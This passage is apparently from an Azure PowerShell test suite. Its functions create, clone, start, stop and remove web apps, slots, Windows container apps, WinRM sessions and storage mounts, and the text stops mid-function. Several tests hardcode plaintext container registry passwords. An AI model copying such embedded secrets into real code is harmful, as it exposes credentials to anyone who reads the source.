














function Test-GetWebApp
{
	
	$rgname = Get-ResourceGroupName
	$wname = Get-WebsiteName
	$wname2 = Get-WebsiteName
	$location = Get-WebLocation
	$whpName = Get-WebHostPlanName
	$tier = "Shared"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier
		
		
		$actual = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName 
		
		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId
		
		
		$result = Get-AzWebApp -Name $wname

		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId

		
		$actual = New-AzWebApp -ResourceGroupName $rgname -Name $wname2 -Location $location -AppServicePlan $whpName

		
		Assert-AreEqual $wname2 $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId

		
		$result = Get-AzWebApp

		
		Assert-True { $result.Count -ge 2 }

		
		$result = Get-AzWebApp -Location $location
		
		
		Assert-True { $result.Count -ge 2 }
		
		
		$result = Get-AzWebApp -ResourceGroupName $rgname
		
		
		Assert-AreEqual 2 $result.Count

		
		$result = Get-AzWebApp -AppServicePlan $serverFarm
		
		
		Assert-True { $result.Count -ge 2 }

	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname2 -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-StartStopRestartWebApp
{
	
	$rgname = Get-ResourceGroupName
	$wname = Get-WebsiteName
	$location = Get-WebLocation
	$whpName = Get-WebHostPlanName
	$tier = "Shared"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier
		
		
		$webApp = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName 
		
		
		Assert-AreEqual $wname $webApp.Name
		Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId
		
		
		$webApp = $webApp | Stop-AzWebApp

		Assert-AreEqual "Stopped" $webApp.State
		$ping = PingWebApp $webApp

		
		$webApp = $webApp | Start-AzWebApp

		Assert-AreEqual "Running" $webApp.State
		$ping = PingWebApp $webApp

		
		$webApp = Stop-AzWebApp -ResourceGroupName $rgname -Name $wname

		Assert-AreEqual "Stopped" $webApp.State
		$ping = PingWebApp $webApp

		
		$webApp = Start-AzWebApp -ResourceGroupName $rgname -Name $wname

		Assert-AreEqual "Running" $webApp.State
		$ping = PingWebApp $webApp

		
		$webApp = Restart-AzWebApp -ResourceGroupName $rgname -Name $wname

		Assert-AreEqual "Running" $webApp.State
		$ping = PingWebApp $webApp

		
		$webApp = $webApp | Restart-AzWebApp

		Assert-AreEqual "Running" $webApp.State
		$ping = PingWebApp $webApp
	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-CloneNewWebApp
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$location = Get-WebLocation
	$planName = Get-WebHostPlanName
	$tier = "Premium"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	
	$destPlanName = Get-WebHostPlanName
	$destLocation = Get-SecondaryLocation
	$destAppName = Get-WebsiteName

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		$webapp = Get-AzWebApp -ResourceGroupName $rgname -Name $appname
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		$serverFarm2 = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $destPlanName -Location  $destLocation -Tier $tier

		
		$webapp2 = New-AzWebApp -ResourceGroupName $rgname -Name $destAppName -Location $destLocation -AppServicePlan $destPlanName -SourceWebApp $webapp
		
		
		Assert-AreEqual $destAppName $webapp2.Name

		
		$webapp2 = Get-AzWebApp -ResourceGroupName $rgname -Name $destAppName
		
		
		Assert-AreEqual $destAppName $webapp2.Name
	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force

		Remove-AzWebApp -ResourceGroupName $rgname -Name $destAppName -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $destPlanName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-CloneNewWebAppAndDeploymentSlots
{
	
	$rgname = Get-ResourceGroupName
	$appname = Get-WebsiteName
	$slot1name = "staging"
	$slot2name = "testing"
	$location = Get-WebLocation
	$planName = Get-WebHostPlanName
	$tier = "Premium"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	
	$destPlanName = Get-WebHostPlanName
	$destLocation = Get-SecondaryLocation
	$destAppName = Get-WebsiteName

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		$webapp = Get-AzWebApp -ResourceGroupName $rgname -Name $appname
		
		
		Assert-AreEqual $appname $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		$slot1 = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slot1name -AppServicePlan $planName
		$appWithSlotName = "$appname/$slot1name"

		
		Assert-AreEqual $appWithSlotName $slot1.Name
		Assert-AreEqual $serverFarm.Id $slot1.ServerFarmId

		
		$slot2 = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slot2name -AppServicePlan $planName
		$appWithSlotName = "$appname/$slot2name"

		
		Assert-AreEqual $appWithSlotName $slot2.Name
		Assert-AreEqual $serverFarm.Id $slot2.ServerFarmId

		
		$serverFarm2 = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $destPlanName -Location  $destLocation -Tier $tier

		
		$webapp2 = New-AzWebApp -ResourceGroupName $rgname -Name $destAppName -Location $destLocation -AppServicePlan $destPlanName -SourceWebApp $webapp -IncludeSourceWebAppSlots
		
		
		Assert-AreEqual $destAppName $webapp2.Name

		
		$webapp2 = Get-AzWebApp -ResourceGroupName $rgname -Name $destAppName
		
		
		Assert-AreEqual $destAppName $webapp2.Name

		
		$slot1 = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $destAppName -Slot $slot1name

		$appWithSlotName = "$destAppName/$slot1name"

		
		Assert-AreEqual $appWithSlotName $slot1.Name
		Assert-AreEqual $serverFarm2.Id $slot1.ServerFarmId

		
		$slot2 = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $destAppName -Slot $slot2name
		$appWithSlotName = "$destAppName/$slot2name"

		
		Assert-AreEqual $appWithSlotName $slot2.Name
		Assert-AreEqual $serverFarm2.Id $slot2.ServerFarmId
	}
	finally
	{
		
		Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slot1name -Force
		Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slot2name -Force
		Remove-AzWebApp -ResourceGroupName $rgname -Name $appname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force

		Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $destAppName -Slot $slot1name -Force
		Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $destAppName -Slot $slot2name -Force
		Remove-AzWebApp -ResourceGroupName $rgname -Name $destAppName -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $destPlanName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-CloneNewWebAppWithTrafficManager
{
	
	$rgname = Get-ResourceGroupName
	$wname = Get-WebsiteName
	$location = Get-WebLocation
	$whpName = Get-WebHostPlanName
	$tier = "Premium"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	
	$destAppServicePlanName = Get-WebHostPlanName
	$destLocation = Get-SecondaryLocation
	$destWebAppName = Get-WebsiteName
	$profileName = Get-TrafficManagerProfileName

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier
		
		
		$actual = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName 
		
		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId

		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wname
		
		
		Assert-AreEqual $wname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId

		
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $destAppServicePlanName -Location  $destLocation -Tier $tier

		
		$actual = New-AzWebApp -ResourceGroupName $rgname -Name $destWebAppName -Location $destLocation -AppServicePlan $destAppServicePlanName -SourceWebApp $result -TrafficManagerProfileName $profileName
		
		
		Assert-AreEqual $destWebAppName $actual.Name

		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $destWebAppName
		
		
		Assert-AreEqual $destWebAppName $result.Name
	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force

		Remove-AzWebApp -ResourceGroupName $rgname -Name $destWebAppName -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $destAppServicePlanName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-CreateNewWebApp
{
	
	$rgname = Get-ResourceGroupName
	$wname = Get-WebsiteName
	$location = Get-WebLocation
	$whpName = Get-WebHostPlanName
	$tier = "Shared"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier
		
		
		$job = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName -AsJob
		$job | Wait-Job
		$actual = $job | Receive-Job
		
		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId

		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wname
		
		
		Assert-AreEqual $wname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId
	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-CreateNewWebAppHyperV
{
	
	$rgname = Get-ResourceGroupName
	$wname = Get-WebsiteName
	$location = Get-WebLocation
	$whpName = Get-WebHostPlanName
	$tier = "PremiumContainer"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
    $containerImageName = "pstestacr.azurecr.io/tests/iis:latest"
    $containerRegistryUrl = "https://pstestacr.azurecr.io"
    $containerRegistryUser = "pstestacr"
    $pass = "cYK4qnENExflnnOkBN7P+gkmBG0sqgIv"
    $containerRegistryPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force
    $dockerPrefix = "DOCKER|" 


	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier -WorkerSize Small -HyperV
		
		
		$job = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName -ContainerImageName $containerImageName -ContainerRegistryUrl $containerRegistryUrl -ContainerRegistryUser $containerRegistryUser -ContainerRegistryPassword $containerRegistryPassword -AsJob
		$job | Wait-Job
		$actual = $job | Receive-Job
		
		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId

		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wname
		
		
		Assert-AreEqual $wname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId
        Assert-AreEqual $true $result.IsXenon
        Assert-AreEqual ($dockerPrefix + $containerImageName)  $result.SiteConfig.WindowsFxVersion

        $appSettings = @{
        "DOCKER_REGISTRY_SERVER_URL" = $containerRegistryUrl;
        "DOCKER_REGISTRY_SERVER_USERNAME" = $containerRegistryUser;
        "DOCKER_REGISTRY_SERVER_PASSWORD" = $pass;}

        foreach($nvp in $webApp.SiteConfig.AppSettings)
		{
			Assert-True { $appSettings.Keys -contains $nvp.Name }
			Assert-True { $appSettings[$nvp.Name] -match $nvp.Value }
		}


	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-EnableContainerContinuousDeploymentAndGetUrl
{
	
	$rgname = Get-ResourceGroupName
	$wname = Get-WebsiteName
	$location = Get-WebLocation
	$whpName = Get-WebHostPlanName
	$tier = "PremiumContainer"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
    $containerImageName = "pstestacr.azurecr.io/tests/iis:latest"
    $containerRegistryUrl = "https://pstestacr.azurecr.io"
    $containerRegistryUser = "pstestacr"
    $pass = "cYK4qnENExflnnOkBN7P+gkmBG0sqgIv"
    $containerRegistryPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force
    $dockerPrefix = "DOCKER|"
 	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier -WorkerSize Small -HyperV

		
		$job = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName -ContainerImageName $containerImageName -ContainerRegistryUrl $containerRegistryUrl -ContainerRegistryUser $containerRegistryUser -ContainerRegistryPassword $containerRegistryPassword -EnableContainerContinuousDeployment -AsJob
		$job | Wait-Job
		$actual = $job | Receive-Job
		
		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId
 		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wname

		
		Assert-AreEqual $wname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId
        Assert-AreEqual $true $result.IsXenon
        Assert-AreEqual ($dockerPrefix + $containerImageName)  $result.SiteConfig.WindowsFxVersion
         $appSettings = @{
        "DOCKER_REGISTRY_SERVER_URL" = $containerRegistryUrl;
        "DOCKER_REGISTRY_SERVER_USERNAME" = $containerRegistryUser;
        "DOCKER_REGISTRY_SERVER_PASSWORD" = $pass;
        "DOCKER_ENABLE_CI" = "true"}
         foreach($nvp in $webApp.SiteConfig.AppSettings)
		{
			Assert-True { $appSettings.Keys -contains $nvp.Name }
			Assert-True { $appSettings[$nvp.Name] -match $nvp.Value }
		}

         $ci_url = Get-AzWebAppContainerContinuousDeploymentUrl -ResourceGroupName $rgname -Name $wname

		 $expression = "https://" + $wname + ":(.*)@" + $wname + ".scm.azurewebsites.net/docker/hook"
		 $sanitizedCiUrl = { $ci_url -replace '$','' }

		 $matchResult = { $sanitizedCiUrl -match $expression }

		 Assert-AreEqual $true $matchResult
 	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-WindowsContainerCanIssueWebAppPSSession
{
	
	$rgname = Get-ResourceGroupName
	$wname = Get-WebsiteName
	$location = Get-WebLocation
	$whpName = Get-WebHostPlanName
	$tier = "PremiumContainer"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
    $containerImageName = "mcr.microsoft.com/azure-app-service/samples/aspnethelloworld:latest"
    $containerRegistryUrl = "https://mcr.microsoft.com"
	$containerRegistryUser = "testregistry"
    $pass = "7Dxo9p79Ins2K3ZU"
    $containerRegistryPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force
	$dockerPrefix = "DOCKER|"

 	try
	{

		Write-Debug "Creating app service plan..."

		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier -WorkerSize Large -HyperV

		Write-Debug "App service plan created"

		Write-Debug "Creating web app plan..."

		
		$job = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName -ContainerImageName $containerImageName -ContainerRegistryUrl $containerRegistryUrl -ContainerRegistryUser $containerRegistryUser -ContainerRegistryPassword $containerRegistryPassword -AsJob
		$job | Wait-Job
		$actual = $job | Receive-Job
		
		Write-Debug "Webapp created"

		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId
 		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wname

		Write-Debug "Webapp retrieved"

		Write-Debug "Validating web app properties..."

		
		Assert-AreEqual $wname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId
        Assert-AreEqual $true $result.IsXenon
        Assert-AreEqual ($dockerPrefix + $containerImageName)  $result.SiteConfig.WindowsFxVersion

		$actualAppSettings = @{}

		foreach ($kvp in $result.SiteConfig.AppSettings)
		{
			$actualAppSettings[$kvp.Name] = $kvp.Value
		}

		

		$expectedAppSettings = @{}
		$expectedAppSettings["DOCKER_REGISTRY_SERVER_URL"] = $containerRegistryUrl;
		$expectedAppSettings["DOCKER_REGISTRY_SERVER_USERNAME"] = $containerRegistryUser;
		$expectedAppSettings["DOCKER_REGISTRY_SERVER_PASSWORD"] = $pass;

		foreach ($key in $expectedAppSettings.Keys)
		{
			Assert-True {$actualAppSettings.Keys -contains $key}
			Assert-AreEqual $actualAppSettings[$key] $expectedAppSettings[$key]
		}

		Write-Debug "Enabling Win-RM..."

		
		$actualAppSettings["CONTAINER_WINRM_ENABLED"] = "1"
        $webApp = Set-AzWebApp -ResourceGroupName $rgname -Name $wName -AppSettings $actualAppSettings

		
		
		
		
		
		
		
		
		
		
		
		
		
		New-AzWebAppContainerPSSession -ResourceGroupName $rgname -Name $wname -WarningVariable wv -WarningAction SilentlyContinue -ErrorAction SilentlyContinue -Force
		

		if ((Get-WebsitesTestMode) -ne 'Playback') 
		{
			
			$message = "Connecting to remote server $wname.azurewebsites.net failed with the following error message : The connection to the specified remote host was refused."
			$resultError = $Error[0] -like "*$($message)*"
			Write-Debug "Expected Message: $message"
		}
		else
		{
			
			$messageDNS = "Connecting to remote server $wname.azurewebsites.net failed with the following error message : The WinRM client cannot process the request because the server name cannot be resolved"
			$messageUnavailable = "Connecting to remote server $wname.azurewebsites.net failed with the following error message : The WinRM client sent a request to an HTTP server and got a response saying the requested HTTP URL was not available."
			$messagePsVersionNotSupported = "Remote Powershell sessions into Windows Containers on App Service from this version of PowerShell is not supported.";

			
			$messageWSMANNotConfigured = "Your current WSMAN Trusted Hosts settings will prevent you from connecting to your Container Web App";

			$resultError = ($Error[0] -like "*$($messageDNS)*") -or 
				($Error[0] -like "*$($messageUnavailable)*") -or 
				($Error[0] -like "*$($messageWSMANNotConfigured)*") -or
				($Error[0] -like "*$($messagePsVersionNotSupported)*")
			
			$resultWarning = ($wv[0] -like "*$($messageWSMANNotConfigured)*")

			Write-Debug "Expected error message 1: $messageDNS"
			Write-Debug "Expected error message 2: $messageUnavailable"
			Write-Debug "Expected error message 3: $messagePsVersionNotSupported"
			
			Write-Debug "Expected Warning message 1: $messageWSMANNotConfigured"


		}
		
		Write-Debug "Error: $Error[0]"
		Write-Debug "Warnings: $wv"
		
		Write-Debug "Printing PsVersion"
		foreach ($key in $PsVersionTable.Keys)
		{
			Write-Debug "$key"
			foreach($v in $PsVersionTable[$key])
			{
				Write-Debug "   $v"
			}
		}

		
		If(!$resultError -or !$resultWarning)
		{
			Write-Output "expected error $($message), actual error $($Error[0])"
			Write-Output "Warnings: $wv"
		}
		Assert-True {$resultError -or $resultWarning}
 	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-WindowsContainerWebAppPSSessionOpened
{
	
	$rgname = Get-ResourceGroupName
	$wname = Get-WebsiteName
	$location = Get-WebLocation
	$whpName = Get-WebHostPlanName
	$tier = "PremiumContainer"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
    $containerImageName = "mcr.microsoft.com/azure-app-service/samples/aspnethelloworld:latest"
    $containerRegistryUrl = "https://mcr.microsoft.com"
	$containerRegistryUser = "testregistry"
    $pass = "7Dxo9p79Ins2K3ZU"
    $containerRegistryPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force
	$dockerPrefix = "DOCKER|"

 	try
	{

		Write-Debug "Creating app service plan..."

		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier -WorkerSize Large -HyperV

		Write-Debug "App service plan created"

		Write-Debug "Creating web app plan..."

		
		$job = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName -ContainerImageName $containerImageName -ContainerRegistryUrl $containerRegistryUrl -ContainerRegistryUser $containerRegistryUser -ContainerRegistryPassword $containerRegistryPassword -AsJob
		$job | Wait-Job
		$actual = $job | Receive-Job
		
		Write-Debug "Webapp created"

		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId
 		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wname

		Write-Debug "Webapp retrieved"

		Write-Debug "Validating web app properties..."

		
		Assert-AreEqual $wname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId
        Assert-AreEqual $true $result.IsXenon
        Assert-AreEqual ($dockerPrefix + $containerImageName)  $result.SiteConfig.WindowsFxVersion

		$actualAppSettings = @{}

		foreach ($kvp in $result.SiteConfig.AppSettings)
		{
			$actualAppSettings[$kvp.Name] = $kvp.Value
		}

		

		$expectedAppSettings = @{}
		$expectedAppSettings["DOCKER_REGISTRY_SERVER_URL"] = $containerRegistryUrl;
		$expectedAppSettings["DOCKER_REGISTRY_SERVER_USERNAME"] = $containerRegistryUser;
		$expectedAppSettings["DOCKER_REGISTRY_SERVER_PASSWORD"] = $pass;

		foreach ($key in $expectedAppSettings.Keys)
		{
			Assert-True {$actualAppSettings.Keys -contains $key}
			Assert-AreEqual $actualAppSettings[$key] $expectedAppSettings[$key]
		}

		Write-Debug "Enabling Win-RM..."

		
		$actualAppSettings["CONTAINER_WINRM_ENABLED"] = "1"
        $webApp = Set-AzWebApp -ResourceGroupName $rgname -Name $wName -AppSettings $actualAppSettings

		$status = PingWebApp($webApp)
		Write-Debug "Just pinged the web app"
		Write-Debug "Status: $status"

		
		
		

		$count=0
		while (($status -like "ServiceUnavailable") -and $count -le 15)
		{
			Wait-Seconds 60
		    $status = PingWebApp($webApp)
			Write-Debug $count
			$count++
		}

		
		Assert-AreEqual $status "200"

		$ps_session = New-AzWebAppContainerPSSession -ResourceGroupName $rgname -Name $wname -Force

		Write-Debug "After PSSession"

		Assert-AreEqual $ps_session.ComputerName $wname".azurewebsites.net"
		Assert-AreEqual $ps_session.State "Opened"
 	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-SetAzureStorageWebAppHyperV
{
	
	$rgname = Get-ResourceGroupName
	$wname = Get-WebsiteName
	$location = Get-WebLocation
	$whpName = Get-WebHostPlanName
	$tier = "PremiumContainer"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
    $containerImageName = "pstestacr.azurecr.io/tests/iis:latest"
    $containerRegistryUrl = "https://pstestacr.azurecr.io"
    $containerRegistryUser = "pstestacr"
    $pass = "cYK4qnENExflnnOkBN7P+gkmBG0sqgIv"
    $containerRegistryPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force
    $dockerPrefix = "DOCKER|" 
	$azureStorageAccountCustomId1 = "mystorageaccount"
	$azureStorageAccountType1 = "AzureFiles"
	$azureStorageAccountName1 = "myaccountname.file.core.windows.net"
	$azureStorageAccountShareName1 = "myremoteshare"
	$azureStorageAccountAccessKey1 = "AnAccessKey"
	$azureStorageAccountMountPath1 = "C:\mymountpath"
	$azureStorageAccountCustomId2 = "mystorageaccount2"
	$azureStorageAccountType2 = "AzureFiles"
	$azureStorageAccountName2 = "myaccountname2.file.core.windows.net"
	$azureStorageAccountShareName2 = "myremoteshare2"
	$azureStorageAccountAccessKey2 = "AnAccessKey2"
	$azureStorageAccountMountPath2 = "C:\mymountpath2"

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier -WorkerSize Small -HyperV
		
		
		$job = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName -ContainerImageName $containerImageName -ContainerRegistryUrl $containerRegistryUrl -ContainerRegistryUser $containerRegistryUser -ContainerRegistryPassword $containerRegistryPassword -AsJob
		$job | Wait-Job
		$actual = $job | Receive-Job
		
		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId

		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wname
		
		
		Assert-AreEqual $wname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId
        Assert-AreEqual $true $result.IsXenon
        Assert-AreEqual ($dockerPrefix + $containerImageName)  $result.SiteConfig.WindowsFxVersion

		$testStorageAccount1 = New-AzWebAppAzureStoragePath -Name $azureStorageAccountCustomId1 -Type $azureStorageAccountType1 -AccountName $azureStorageAccountName1 -ShareName $azureStorageAccountShareName1 -AccessKey $azureStorageAccountAccessKey1 -MountPath $azureStorageAccountMountPath1
		$testStorageAccount2 = New-AzWebAppAzureStoragePath -Name $azureStorageAccountCustomId2 -Type $azureStorageAccountType2 -AccountName $azureStorageAccountName2 -ShareName $azureStorageAccountShareName2 -AccessKey $azureStorageAccountAccessKey2 -MountPath $azureStorageAccountMountPath2

		Write-Debug "Created the new storage account paths"

		Write-Debug $testStorageAccount1.Name
		Write-Debug $testStorageAccount2.Name


		
        $webApp = Set-AzWebApp -ResourceGroupName $rgname -Name $wname -AzureStoragePath $testStorageAccount1, $testStorageAccount2

		Write-Debug "Set the new storage account paths"


		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wname
		$azureStorageAccounts = $result.AzureStoragePath

		
		Write-Debug $azureStorageAccounts[0].Name
		Assert-AreEqual $azureStorageAccounts[0].Name $azureStorageAccountCustomId1

		Write-Debug $azureStorageAccounts[0].Type
		Assert-AreEqual $azureStorageAccounts[0].Type $azureStorageAccountType1
		
		Write-Debug $azureStorageAccounts[0].AccountName
		Assert-AreEqual $azureStorageAccounts[0].AccountName $azureStorageAccountName1
		
		Write-Debug $azureStorageAccounts[0].ShareName
		Assert-AreEqual $azureStorageAccounts[0].ShareName $azureStorageAccountShareName1
		
		Write-Debug $azureStorageAccounts[0].AccessKey 
		Assert-AreEqual $azureStorageAccounts[0].AccessKey $azureStorageAccountAccessKey1
		
		Write-Debug $azureStorageAccounts[0].MountPath
		Assert-AreEqual $azureStorageAccounts[0].MountPath $azureStorageAccountMountPath1

		Write-Debug $azureStorageAccounts[1].Name
		Assert-AreEqual $azureStorageAccounts[1].Name $azureStorageAccountCustomId2

		Write-Debug $azureStorageAccounts[1].Type
		Assert-AreEqual $azureStorageAccounts[1].Type $azureStorageAccountType2

		Write-Debug $azureStorageAccounts[1].AccountName
		Assert-AreEqual $azureStorageAccounts[1].AccountName $azureStorageAccountName2

		Write-Debug $azureStorageAccounts[1].ShareName
		Assert-AreEqual $azureStorageAccounts[1].ShareName $azureStorageAccountShareName2

		Write-Debug $azureStorageAccounts[1].AccessKey
		Assert-AreEqual $azureStorageAccounts[1].AccessKey $azureStorageAccountAccessKey2

		Write-Debug $azureStorageAccounts[1].MountPath
		Assert-AreEqual $azureStorageAccounts[1].MountPath $azureStorageAccountMountPath2
	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-CreateNewWebAppOnAse
{
	
	
	
	$rgname = "mnresourcegroup"
	$wname = Get-WebsiteName
	$location = "South Central US"
	$whpName = "powershellasp"
